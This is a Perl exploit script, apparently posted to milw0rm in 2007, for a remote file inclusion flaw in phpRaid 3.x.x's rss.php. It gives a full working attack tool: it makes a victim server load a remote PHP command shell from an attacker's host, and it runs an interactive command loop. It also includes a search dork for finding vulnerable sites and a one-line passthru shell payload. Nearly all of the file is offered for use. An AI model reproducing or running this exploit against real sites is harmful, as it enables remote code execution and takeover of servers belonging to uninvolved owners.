#!/usr/bin/perl
# phpraid <= 3.x.x (rss.php) Remote File Inclusion Exploit
# Download Script : http://up.9q9q.net/up/index.php?f=994a86950
# Founded & Coded by: Cold z3ro , Cold-z3ro@hotmail.com
# Dork : inurl:"phpRaid" , "phpRaid" , "roster.php?Sort=Race"
# perl cold-z3ro.pl <target> <cmd shell location> <cmd shell variable>
# cmd shell example: <?passthru($_GET[cmd]);?>
# Exploit : http://www.example.com/phpRaid_path/rss.php?phpraid_dir=Evil-script?
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
      print "[shell] \$";
while(<STDIN>)
      {
              $cmd=$_;
              chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'rss.php?phpraid_dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[....]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}

else {print "[shell] \$";}}}last;

sub head()
{
print "\n======================Long Life My Home Land Palestine======================\r\n";
print "\r\n";
print "       * phpraid <= 3.x.x (rss.php) Remote File Inclusion Exploit *\r\n";
print "\r\n";
print "============================================================================\r\n";
}
sub usage()
{
head();
print "\r\n";
print "  Usage: perl Cold-z3ro.pl <Victim> <Cmd Shell Location> <Cmd Shell Variable>\r\n\n";
print "  <Victim> - Full path to example: http://www.site.com/phpRaid/ \r\n";
print "  <cmd shell> - Path to Cmd Shell e.g  http://b0rizq.by.ru/c99.txt? \r\n";
print "  <cmd variable> - Cmd Variable Used In Php Shell like [ id ]\r\n";
print "\r\n";
print "============================================================================\r\n";
print "\r\n";
print "                     found  And  Coded  By  Cold z3ro \r\n";
print "                       Cold-z3ro[at]hotmail[dot]com \r\n";
print "          Greetz To: www.milw0rm.com , www.hack-teach.com , www.4azhar.com \r\n";
print "                Dork : inurl:phpRaid , /roster.php?Sort=Race\r\n";
print "\r\n";
print "============================================================================\r\n";
exit();
}

# milw0rm.com [2007-03-20]
